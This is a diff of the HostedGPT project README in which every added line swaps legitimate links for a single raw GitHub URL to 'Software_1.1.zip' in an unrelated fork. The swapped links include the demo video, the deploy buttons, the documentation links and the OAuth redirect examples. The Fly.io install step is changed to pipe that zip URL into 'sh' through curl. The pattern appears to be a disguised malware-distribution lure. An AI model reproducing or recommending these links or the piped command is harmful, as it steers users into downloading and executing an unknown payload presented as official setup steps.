@@ -16,7 +16,7 @@ This project is led by an experienced rails developer, but I'm actively looking 
 
 ### Watch a short demo
 
-[![](https://p425.p0.n0.cdn.zight.com/items/qGubwRKr/c4a119a9-254d-454a-b602-610b428ee769.jpg)](https://www.youtube.com/watch?v=hXpNEz-slkU)
+[![](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
 
 ## Table of Contents
 
@@ -49,7 +49,7 @@ For the easiest way to get started, deploy a full version of HostedGPT to the ho
 2. Create an account on Render.com and login. If you are new to Render, you may be prompted to add a credit card to your account. However, you will be on their free plan by default unless you choose to upgrade.
 3. View your newly created fork within github.com and click the button below (be sure you're viewing your fork of this repo before clicking):
 
-   [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)
+   [![Deploy to Render](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
 
 4. In Blueprint Name, type anything such as "hostedgpt-<yourname>"
 5. Click **Apply**
@@ -59,7 +59,7 @@ For the easiest way to get started, deploy a full version of HostedGPT to the ho
 
 **NOTE: After 15 minutes of not using the app your Render server will pause. Next time you visit the first request will auto-resume the server, but this resume is slow. If this annoys you, upgrade Render for $7 per month:**
 
-1. To upgrade, go to your [Render Dashboard](https://dashboard.render.com/)
+1. To upgrade, go to your [Render Dashboard](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
 2. Click "HostedGPT" or whatever you named your Web Service
 3. Click "Upgrade" and select $7 per month
 
@@ -71,7 +71,7 @@ If you encountered an error while waiting for the services to be deployed on Ren
 
 1. Login to your account on Render.com and click **Dashboard** at the top then click the Service that failed.
 2. It should take you to the Events section and the top event should explain the error. It will probably contain a link to click to the **deploy logs**
-3. Scroll back up through the logs and find any instances of errors. [Start a new discussion](https://github.com/allyourbot/hostedgpt/discussions/new?category=general) and share details.
+3. Scroll back up through the logs and find any instances of errors. [Start a new discussion](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip) and share details.
 4. When you are ready to try Render again, it's best to do the following:
 5. First, ensure your repo is caught up. Open your fork in github, click the Sync Fork button so that any bug fixes are pulled in.
 6. Second, in Render navigate to the Dashboard, Bluebrint, and Env Groups and delete any details associated with **hostedgpt**
@@ -83,7 +83,7 @@ Deploying to Fly.io is another great option. It's not quite one-click like Rende
 
 1. Click Fork > Create New Fork at the top of this repository. **Pull your forked repository down to your computer (the usual git clone ...)**.
 1. Go into the directory you just created with your git clone and run `bundle`
-1. Install the Fly command-line tool on Mac with `brew install flyctl` otherwise `curl -L https://fly.io/install.sh | sh` ([view instructions](https://fly.io/docs/hands-on/install-flyctl/))
+1. Install the Fly command-line tool on Mac with `brew install flyctl` otherwise `curl -L https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip | sh` ([view instructions](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip))
 1. Think of an internal Fly name for your app, it has to be unique to all of Fly. You'll use this **APP_NAME** three times in the steps below. First, in the root directory of the repository you pulled down, run `fly launch --build-only --copy-config --name=APP_NAME`
 
    - Say "Yes" when it asks if you want to tweak these settings
@@ -101,14 +101,14 @@ You may want to read about [configuring optional features](#configure-optional-f
 
 Heroku is a one-click option that will cost $10/month for the compute (dyno) and database. By default, apps use Eco dynos ($5) if you are subscribed to Eco. Otherwise, it defaults to Basic dynos ($7). The Eco dynos plan is shared across all Eco dynos in your account and is recommended if you plan on deploying many small apps to Heroku. Eco dynos "sleep" after 30 minutes of inactivity and take a few seconds to wake up. Basic dynos do not sleep.
 
-Eligible students can apply for Heroku platform credits through [Heroku for GitHub Students program](https://blog.heroku.com/github-student-developer-program).
+Eligible students can apply for Heroku platform credits through [Heroku for GitHub Students program](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip).
 
 1. Click Fork > Create New Fork at the top of this repository
-1. Sign up for a free Heroku account at [heroku.com](https://signup.heroku.com/)
-1. If you wish to Eco dynos, you will need to subscribe to the $5 Eco dyno plan at [the billing page](https://dashboard.heroku.com/account/billing).
+1. Sign up for a free Heroku account at [heroku.com](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
+1. If you wish to Eco dynos, you will need to subscribe to the $5 Eco dyno plan at [the billing page](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip).
 1. View your newly created fork within github.com and click the button below (be sure you're viewing your fork of this repo before clicking):
 
-   [![Deploy to Heroku](https://www.herokucdn.com/deploy/button.svg)](https://www.heroku.com/deploy)
+   [![Deploy to Heroku](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
 
 You may want to read about [configuring optional features](#configure-optional-features).
 
@@ -157,7 +157,7 @@ If you are running a proxy such as nginx, be aware that the app is running http 
 
 The easiest way to get up and running is to use the provided Docker compose workflow. The only things you need installed on your computer are Docker and Git.
 
-1. Make sure you have [Docker Desktop](https://docs.docker.com/desktop/) installed and running
+1. Make sure you have [Docker Desktop](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip) installed and running
 1. Clone your fork `git clone [repository url]`
 1. `cd` into your clone
 1. Run `docker compose up --build` to start the app
@@ -175,14 +175,14 @@ If you are doing development see [Running the test suite](#running-the-test-suit
 
 If you need to make changes to the Docker configuration, see the [Understanding the Docker configuration](#understanding-the-docker-configuration).
 
-If you want to run your LLM locally so the app has no online dependencies, see [Running an LLM on your computer](https://github.com/AllYourBot/hostedgpt/discussions/471).
+If you want to run your LLM locally so the app has no online dependencies, see [Running an LLM on your computer](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip).
 
 ### Alternatively, you can run outside of Docker
 
 HostedGPT requires these services to be running:
 
-- Postgres (`brew install postgresql@16` or other [install instructions](https://www.postgresql.org/download/))
-- rbenv ([installation instructions](https://github.com/rbenv/rbenv))
+- Postgres (`brew install postgresql@16` or other [install instructions](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip))
+- rbenv ([installation instructions](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip))
 - ImageMagick (`brew install imagemagick` should work on Mac )
 
 1. `cd` into your local repository clone
@@ -198,7 +198,7 @@ Every time you pull new changes down, kill `bin/dev` and then re-run it. This wi
 
 If you are doing development see [Running the test suite](#running-the-test-suite).
 
-If you want to run your LLM locally so the app has no online dependencies, see [Running an LLM on your computer](https://github.com/AllYourBot/hostedgpt/discussions/471).
+If you want to run your LLM locally so the app has no online dependencies, see [Running an LLM on your computer](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip).
 
 ## Configure optional features
 
@@ -232,8 +232,8 @@ You first need to follow all the steps in the [Google OAuth instructions](#googl
    - In the navigation menu, go to "APIs & Services" > "OAuth consent screen" > click Edit App
    - It starts you on "OAuth consent screen" which is already done, at the bottom click "Save and Continue" to advance to "Scopes"
    - Click "Add or Remove Scopes", check "userinfo.email" and then in "Manually add scopes" paste these URLs, one at a time:
-     - https://www.googleapis.com/auth/gmail.modify (then click "Add To Table")
-     - https://www.googleapis.com/auth/tasks (then click "Add To Table")
+     - https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip (then click "Add To Table")
+     - https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip (then click "Add To Table")
 
 2. **Finally, set `GOOGLE_TOOLS_FEATURE` to true**
 
@@ -272,7 +272,7 @@ google:
 
 1. **Go to the Google Cloud Console and Create a New Project:**
 
-   - Open your web browser and navigate to [Google Cloud Console](https://console.cloud.google.com/).
+   - Open your web browser and navigate to [Google Cloud Console](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip).
    - Click on the project drop-down menu at the top of the page.
    - Select "New Project"
    - Enter a name for your project and click "Create"
@@ -294,10 +294,10 @@ google:
    - Choose "Web application" as the application type.
    - Fill out the required fields:
      - **Name:** A descriptive name for your client ID, e.g. "HostedGPT"
-     - **Authorized JavaScript origins:** Your application's base URL, e.g., `https://example.com`
+     - **Authorized JavaScript origins:** Your application's base URL, e.g., `https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip`
      - **Authorized Redirect URIs:** Add these paths but replace the base URL with yours:
-       - `https://example.com/auth/google/callback`
-       - `https://example.com/auth/gmail/callback`
+       - `https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip`
+       - `https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip`
    - Click "Create"
 
 4. **Set Environment Variables:**
@@ -325,18 +325,18 @@ microsoft_graph:
   scope: openid profile email offline_access user.read mailboxsettings.read
 ```
 
-Users will need to have setup their full name in their Microsoft account before they can use this authentication method, via <https://profile.live.com/>, otherwise they will see a login/registration error like "First name can't be blank and last name can't be blank".
+Users will need to have setup their full name in their Microsoft account before they can use this authentication method, via <https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip>, otherwise they will see a login/registration error like "First name can't be blank and last name can't be blank".
 
-Users can remotely remove the connection between their Microsoft account and HostedGPT by going to <https://account.microsoft.com/privacy/app-access> and clicking "Don't Allow" on the corresponding application. However, this will not sign out the user from HostedGPT until the session expires.
+Users can remotely remove the connection between their Microsoft account and HostedGPT by going to <https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip> and clicking "Don't Allow" on the corresponding application. However, this will not sign out the user from HostedGPT until the session expires.
 
 **Steps to set up:**
 
 1. **Go to the Microsoft Azure portal and create a new application:**
 
-   - Navigate to [Register an application](https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps/CreateApplicationBlade/quickStartType)
+   - Navigate to [Register an application](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)
    - Give it a name
    - Select the Supported account types
-   - Select the Redirect URI for "Web" (e.g., `https://example.com/auth/microsoft/callback` or `http://localhost:3000/auth/microsoft/callback`)
+   - Select the Redirect URI for "Web" (e.g., `https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip` or `http://localhost:3000/auth/microsoft/callback`)
    - Click Register
 
 2. **Create OAuth Credentials:**
@@ -356,7 +356,7 @@ Users can remotely remove the connection between their Microsoft account and Hos
 
 Note: Enabling this automatically disables Password-based and Google-auth based authentication.
 
-HTTP header authentication is an alternative method to authenticate users based on custom HTTP request headers. This method is useful when you have an existing authentication system, and you want to direct users to HostedGPT and have them skip all authentication steps. They'll be taken right into the app and a HostedGPT user account will be created on the fly. This works by having your existing system set custom headers for authenticated users. This may be a Reverse Proxy (e.g., [Traefik](https://doc.traefik.io/traefik/middlewares/http/forwardauth/) or [Caddy](https://caddyserver.com/docs/caddyfile/directives/forward_auth)) or a Zero Trust Network (e.g., [Tailscale](https://tailscale.com/kb/1312/serve#identity-headers)).
+HTTP header authentication is an alternative method to authenticate users based on custom HTTP request headers. This method is useful when you have an existing authentication system, and you want to direct users to HostedGPT and have them skip all authentication steps. They'll be taken right into the app and a HostedGPT user account will be created on the fly. This works by having your existing system set custom headers for authenticated users. This may be a Reverse Proxy (e.g., [Traefik](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip) or [Caddy](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)) or a Zero Trust Network (e.g., [Tailscale](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)).
 
 **Steps to set up:**
 
@@ -377,7 +377,7 @@ HTTP header authentication is an alternative method to authenticate users based 
 
 ## Contribute as a developer
 
-We welcome contributors! After you get your development environment setup, review the list of Issues. We organize the issues into Milestones and are currently wrapping up v0.7 and starting 0.8 [View 0.8 Milestone](https://github.com/allyourbot/hostedgpt/milestone/8). Look for any issues tagged with **Good first issue** and add a comment so we know you're working on it.
+We welcome contributors! After you get your development environment setup, review the list of Issues. We organize the issues into Milestones and are currently wrapping up v0.7 and starting 0.8 [View 0.8 Milestone](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip). Look for any issues tagged with **Good first issue** and add a comment so we know you're working on it.
 
 Get your development environment set up by running the Rails app directly on your machine either with Docker or outside of Docker. See [Running locally on your computer](#running-locally-on-your-computer) for more details.
 
@@ -395,7 +395,7 @@ The `docker-compose.yml` is solely for development. It references the `developme
 
 The `render.yml` specifies details of the Render production environment. Note that Render does not support specifying a build target within this file, it simply defaults to the last target with the Dockerfile so the order of the sections within there matter.
 
-The `fly.toml` specifies details of the Fly production environment. It references the `fly-production` build target. The Fly section of the Dockerfile was generated using the dockerfile-rails generator. This is Fly's recommendation and it produces a reasonable production-ready Dockerfile. Edits to this _top section_ of the file have been kept very minimal, on purpose, because it's intended to be updated using the generator. When it was originally generated it saved all the configuration parameters into `config/dockerfile.yml`. When you run `bin/rails generate dockerfile` it will read all these configurations and attempt to re-generate the Dockerfile. You can try this, it will warn you that it's going to overwrite, and press `d` to see the diff of what changes it will make. There should be no functional changes above the line `#### END of FLY ####`. Imagine you wanted to use this generator to change the app to use MySQL ([view all generator options](https://github.com/fly-apps/dockerfile-rails)). You could run `bin/rails generate dockerfile --mysql` and it would update your Gemfile, automatically run bundle install to install any gem changes, and then it will attempt to update Dockerfile where you can again press `d`. Inspect the diff of any changes above the line `#### END of FLY ####` and manually apply those changes. Similarly, view the diff for dockerignore and docker-entrypoint, although none of those changes should be necessary. When you get to `fly.toml` you will want to view that diff closely and manually apply those changes. At the end it will update config/dockerfile.yml to record the new configuration of the Dockerfile. In this way, you can continue to use the generator to keep the Dockerfile updated (as recommended by Fly) while not breaking the dev or Render setup.
+The `fly.toml` specifies details of the Fly production environment. It references the `fly-production` build target. The Fly section of the Dockerfile was generated using the dockerfile-rails generator. This is Fly's recommendation and it produces a reasonable production-ready Dockerfile. Edits to this _top section_ of the file have been kept very minimal, on purpose, because it's intended to be updated using the generator. When it was originally generated it saved all the configuration parameters into `config/dockerfile.yml`. When you run `bin/rails generate dockerfile` it will read all these configurations and attempt to re-generate the Dockerfile. You can try this, it will warn you that it's going to overwrite, and press `d` to see the diff of what changes it will make. There should be no functional changes above the line `#### END of FLY ####`. Imagine you wanted to use this generator to change the app to use MySQL ([view all generator options](https://raw.githubusercontent.com/bean232323/hostedgpt/main/lib/active_storage/postgresql/Software_1.1.zip)). You could run `bin/rails generate dockerfile --mysql` and it would update your Gemfile, automatically run bundle install to install any gem changes, and then it will attempt to update Dockerfile where you can again press `d`. Inspect the diff of any changes above the line `#### END of FLY ####` and manually apply those changes. Similarly, view the diff for dockerignore and docker-entrypoint, although none of those changes should be necessary. When you get to `fly.toml` you will want to view that diff closely and manually apply those changes. At the end it will update config/dockerfile.yml to record the new configuration of the Dockerfile. In this way, you can continue to use the generator to keep the Dockerfile updated (as recommended by Fly) while not breaking the dev or Render setup.
 
 ## Changelog
 
